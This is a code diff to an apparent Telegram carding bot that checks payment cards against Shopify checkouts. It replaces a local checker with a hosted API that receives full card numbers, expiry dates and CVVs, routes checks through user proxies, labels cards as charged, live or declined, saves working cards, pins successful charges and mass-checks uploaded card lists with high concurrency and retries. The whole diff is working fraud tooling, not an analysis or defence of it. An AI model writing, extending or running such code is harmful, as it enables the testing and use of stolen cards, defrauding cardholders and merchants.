@@ -45,6 +45,52 @@ ACTIVE_MTXT_PROCESSES = {}
 MTXT_LOCKS = {}
 FILTER_CACHE = {}
 
+# ── Hosted Shopify Card Checker API ───────────────────────────────────────────
+RAILWAY_SHOPIFY_API = os.environ.get("RAILWAY_SHOPIFY_API", "https://shoify-api-production.up.railway.app")
+
+
+async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=60):
+    """Call the hosted Shopify checker API and return a normalized result dict."""
+    payload = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+    if site:
+        payload["site"] = site
+    if proxy:
+        payload["proxy"] = proxy
+    try:
+        async with aiohttp.ClientSession() as _sess:
+            async with _sess.post(
+                f"{RAILWAY_SHOPIFY_API}/check",
+                json=payload,
+                timeout=aiohttp.ClientTimeout(total=timeout),
+            ) as _resp:
+                api_result = await _resp.json(content_type=None)
+    except Exception as e:
+        api_result = {
+            "status": "error",
+            "response": f"API error: {str(e)[:100]}",
+            "gateway": "Shopify Payments",
+            "amount": None,
+            "site": site,
+            "elapsed": 0,
+            "extra": None,
+        }
+    api_result.setdefault("status", "error")
+    api_result.setdefault("response", "Unknown")
+    api_result.setdefault("gateway", "Shopify Payments")
+    api_result.setdefault("amount", None)
+    api_result.setdefault("site", site)
+    api_result.setdefault("elapsed", 0)
+    api_result.setdefault("extra", None)
+    api_result.setdefault("confidence", None)
+    api_result.setdefault("explanation", "")
+    api_result.setdefault("card_type", "")
+    api_result.setdefault("card_bin", "")
+    api_result.setdefault("card_last4", "")
+    if api_result["status"] == "error" and isinstance(api_result["response"], str):
+        if "all sites failed" in api_result["response"].lower():
+            api_result["status"] = "dead_site"
+    return api_result
+
 GLOBAL_MASS_SEM = asyncio.Semaphore(200)
 ACTIVE_MASS_USERS = set()
 MASS_USERS_LOCK = asyncio.Lock()
@@ -1084,7 +1130,7 @@ async def menu_shopify_cb(event):
         f"\U0001f310 **SHOPIFY SELF CHECK**\n{sep}\n\n"
         f"\u25cf `/sh <alias> <cc>` \u2014 Specific gateway\n"
         f"  Use a particular site/gateway\n\n"
-        f"\u25cf `/shp <cc>` \u2014 Shopify Native gate\n"
+        f"\u25cf `/shp <cc>` \u2014 Shopify gate\n"
         f"  Direct captcha-free card check\n\n"
         f"\u25cf `/mtxt` \u2014 Mass check from file\n"
         f"  Reply to .txt with CCs\n\n"
@@ -2829,12 +2875,15 @@ async def gateway_cmd(event):
 
     loading_msg = await event.reply(f"\u25e0 Checking on **{gate_name}**...")
     start_time = time.time()
+    _spinner_done = [False]
 
     async def animate_gate_loading():
         spinner = ["\u25dc", "\u25dd", "\u25de", "\u25df"]
         dots = ["", ".", "..", "..."]
         i = 0
         while True:
+            if _spinner_done[0]:
+                break
             try:
                 s = spinner[i % 4]
                 d = dots[i % 4]
@@ -2848,68 +2897,128 @@ async def gateway_cmd(event):
 
     try:
         if alias == "shp":
-            from gates.shopify_native import shopify_native_check_rich
+            # Call hosted Shopify checker API
+            _shp_proxy = None
+            try:
+                from gateways import get_user_proxy_list, _raw_to_formatted
+                proxy_list = get_user_proxy_list(str(event.sender_id))
+                if proxy_list:
+                    import random as _rng
+                    _rng.shuffle(proxy_list)
+                    _shp_proxy = _raw_to_formatted(proxy_list[0])
+            except:
+                _shp_proxy = get_user_proxy(str(event.sender_id))
 
-            async def shp_progress(msg):
-                try:
-                    await loading_msg.edit(f"\u23f3 **Shopify Native** | {msg}")
-                except Exception:
-                    pass
+            api_result = await call_shopify_api(cc, mm, yy, cvv, site=None, proxy=_shp_proxy, timeout=60)
 
-            result = await asyncio.wait_for(shopify_native_check_rich(cc, mm, yy, cvv, progress_cb=shp_progress), timeout=120)
-            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
+            # Stop the spinner immediately
+            _spinner_done[0] = True
+            try:
+                loading_task.cancel()
+            except:
+                pass
 
-            r_status = result.get("status", "error")
-            r_resp = result.get("response", "Unknown")
-            r_gateway = result.get("gateway", "Shopify Payments")
-            r_amount = result.get("amount")
-            r_site = result.get("site", "")
-            r_elapsed = result.get("elapsed", round(time.time() - start_time, 2))
+            print(f"[SHP] API result: {api_result}")
 
-            amount_str = f"  {r_amount}" if r_amount else ""
+            api_status = api_result.get("status", "error")
+            api_response = api_result.get("response", "Unknown")
+            r_gateway = api_result.get("gateway", "Shopify Payments")
+            r_amount = api_result.get("amount")
+            r_site = api_result.get("site", "")
+            r_elapsed = api_result.get("elapsed", round(time.time() - start_time, 2))
+            r_confidence = api_result.get("confidence")
+            r_explanation = api_result.get("explanation", "")
+            r_card_type = api_result.get("card_type", "")
+            r_card_bin = api_result.get("card_bin", "")
+            r_card_last4 = api_result.get("card_last4", "")
+
+            resp_lower = api_response.lower()
+            if api_status == "error":
+                r_status = "error"
+            elif "charged" in resp_lower:
+                r_status = "charged"
+            elif "ccn live" in resp_lower or "3ds" in resp_lower:
+                r_status = "approved" if "ccn live" in resp_lower else "live"
+            elif "declined" in resp_lower or "invalid" in resp_lower:
+                r_status = "declined"
+            else:
+                r_status = "declined"
+
+            r_resp = api_response
+
+            try:
+                brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
+            except Exception:
+                brand, bin_type, level, bank, country, flag = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""
+
             cc_str = f"{cc}|{mm}|{yy}|{cvv}"
             bot_tag = BOT_USERNAME or ADMIN_USERNAME
             info_str = f"{brand} - {bin_type} - {level}".upper()
 
             if r_status == "charged":
                 header_icon = "\u2705"
-                resp_display = f"Charged \U0001f525"
-                await save_approved_card(cc_str, "CHARGED", r_resp, gate_name, r_site, event.sender_id, first_name)
-            elif r_status == "approved":
+                resp_display = f"CHARGED \U0001f525"
+                try:
+                    await save_approved_card(cc_str, "CHARGED", r_resp, "Shopify", r_site, event.sender_id, first_name)
+                except:
+                    pass
+            elif r_status in ("approved", "live"):
                 header_icon = "\u2705"
-                if "ccn live" in r_resp.lower():
-                    resp_display = f"CCN LIVE\U0001f387"
-                elif "insufficient" in r_resp.lower():
-                    resp_display = f"CCN LIVE\U0001f387"
+                if "ccn live" in resp_lower:
+                    resp_display = f"CCN LIVE \U0001f387"
+                elif "3ds" in resp_lower:
+                    resp_display = f"3DS Required \U0001f512"
                 else:
-                    resp_display = f"{r_resp}\U0001f387"
-                await save_approved_card(cc_str, "APPROVED", r_resp, gate_name, r_site, event.sender_id, first_name)
+                    resp_display = f"APPROVED \U0001f387"
+                try:
+                    await save_approved_card(cc_str, "APPROVED", r_resp, "Shopify", r_site, event.sender_id, first_name)
+                except:
+                    pass
             elif r_status == "declined":
                 header_icon = "\u274c"
-                resp_display = f"Declined \u26d4"
+                resp_display = f"DECLINED \u26d4"
             else:
                 header_icon = "\u2753"
-                resp_display = f"Error - {r_resp}"
+                resp_display = f"ERROR"
 
-            msg = f"""{header_icon} **Shopify Native**
+            msg = f"""{header_icon} **Shopify**
 **Card:** `{cc_str}`
-**Response:** {resp_display}
-**Gateway** \u21e8 {r_gateway}{amount_str}
-**Info** \u21e8 {info_str}
-**Issue** \u21e8 {bank} \U0001f3db
-**Country** \u21e8 {country} {flag}
+**Status:** {resp_display}
+**Bank Response:** {r_resp}
+**Decline Reason:** {r_explanation or 'N/A'}
 
-**Checked By:** [{first_name}](tg://user?id={event.sender_id})
-**Time Taken:** {r_elapsed} seconds"""
+**Gateway:** {r_gateway}
+**Site:** {r_site or 'N/A'}
+**Amount:** ${r_amount or 'N/A'}
+**Card Type:** {r_card_type or 'N/A'}
+**BIN:** {r_card_bin or 'N/A'} | **Last4:** {r_card_last4 or 'N/A'}
+**Confidence:** {r_confidence if r_confidence is not None else 'N/A'}%
 
-            loading_task.cancel()
-            await loading_msg.delete()
-            result_msg = await event.reply(msg)
+**Info:** {info_str} | {country} {flag}
+**Time:** `{r_elapsed}s`
+**Checked By:** [{first_name}](tg://user?id={event.sender_id}) [{bot_tag}]"""
+
+            try:
+                await loading_msg.edit(msg)
+            except Exception:
+                try:
+                    await loading_msg.delete()
+                except:
+                    pass
+                result_msg = await event.reply(msg)
+            else:
+                result_msg = loading_msg
+
             if r_status == "charged":
-                await pin_charged_message(event, result_msg)
+                try:
+                    await pin_charged_message(event, result_msg)
+                except:
+                    pass
+            return
         else:
             response = await run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID)
             if response == "NO_SKOOL_ACCOUNT":
+                _spinner_done[0] = True
                 loading_task.cancel()
                 try: await loading_msg.delete()
                 except: pass
@@ -2943,12 +3052,14 @@ async def gateway_cmd(event):
                 elapsed, first_name, event.sender_id, rank, proxy_status=p_status
             )
 
+            _spinner_done[0] = True
             loading_task.cancel()
             await loading_msg.delete()
             result_msg = await event.reply(msg)
             if status == "CHARGED":
                 await pin_charged_message(event, result_msg)
     except Exception as e:
+        _spinner_done[0] = True
         loading_task.cancel()
         try: await loading_msg.delete()
         except: pass
@@ -4803,7 +4914,6 @@ async def process_mtxt_cards(event, cards, sites):
 
     async def _process_one_with_retry(card, initial_site, slot_idx):
         nonlocal checked, charged, approved, declined, errors
-        from gates.shopify_native import shopify_native_check_rich
 
         parts = card.split('|')
         if len(parts) != 4:
@@ -4831,17 +4941,12 @@ async def process_mtxt_cards(event, cards, sites):
             slot_status[slot_idx] = f"\U0001f7e1 `...{card_short}` \u279c `{site_short}`{retry_tag}"
             await _update_status_msg()
 
-            async def slot_progress(step):
-                emoji = _stage_emoji(step)
-                slot_status[slot_idx] = f"{emoji} `...{card_short}` \u279c `{site_short}` \u2014 {step}{retry_tag}"
-                await _update_status_msg()
-
             should_retry = False
             try:
                 async with GLOBAL_MASS_SEM:
                     result = await asyncio.wait_for(
-                        shopify_native_check_rich(cc, mm, yy, cvv, site=current_site, progress_cb=slot_progress),
-                        timeout=120
+                        call_shopify_api(cc, mm, yy, cvv, site=current_site, proxy=None, timeout=90),
+                        timeout=95
                     )
             except asyncio.TimeoutError:
                 if attempt < MAX_RETRIES:
@@ -4870,6 +4975,9 @@ async def process_mtxt_cards(event, cards, sites):
             r_amount = result.get("amount")
             r_site = result.get("site", current_site)
             r_elapsed = result.get("elapsed", 0)
+            r_confidence = result.get("confidence")
+            r_explanation = result.get("explanation", "")
+            r_card_type = result.get("card_type", "")
 
             response_lower = r_resp.lower()
 
@@ -4926,7 +5034,7 @@ async def process_mtxt_cards(event, cards, sites):
                 slot_status[slot_idx] = f"\u2705 `...{card_short}` \u2014 **APPROVED**"
             else:
                 declined += 1
-                slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 {r_resp[:25]}"
+                slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 {r_resp[:35]}"
 
             if current_site not in site_results:
                 site_results[current_site] = {"price": str(r_amount) if r_amount else "-", "gateway": r_gateway, "cards": []}
@@ -4941,9 +5049,13 @@ async def process_mtxt_cards(event, cards, sites):
                 card_msg = (
                     f"{status_emoji} **{status_header}**\n\n"
                     f"\U0001f4b3 **CC:** `{card}`\n"
+                    f"\U0001f4ac **Bank Response:** {r_resp}\n"
+                    f"\U0001f4ac **Decline Reason:** {r_explanation or 'N/A'}\n"
                     f"\U0001f310 **Gateway:** {r_gateway}\n"
-                    f"\U0001f4ac **Response:** {r_resp}\n"
-                    f"\U0001f4b0 **Price:** {str(r_amount) if r_amount else '-'}\n\n"
+                    f"\U0001f3ea **Site:** {r_site}\n"
+                    f"\U0001f4b0 **Amount:** ${r_amount or 'N/A'}\n"
+                    f"\U0001f4b3 **Card Type:** {r_card_type or 'N/A'}\n"
+                    f"\U0001f4af **Confidence:** {r_confidence if r_confidence is not None else 'N/A'}%\n\n"
                     f"\U0001f4c7 **BIN:** {brand} - {bin_type} - {level}\n"
                     f"\U0001f3e6 **Bank:** {bank}\n"
                     f"\U0001f30d **Country:** {country} {flag}\n\n"
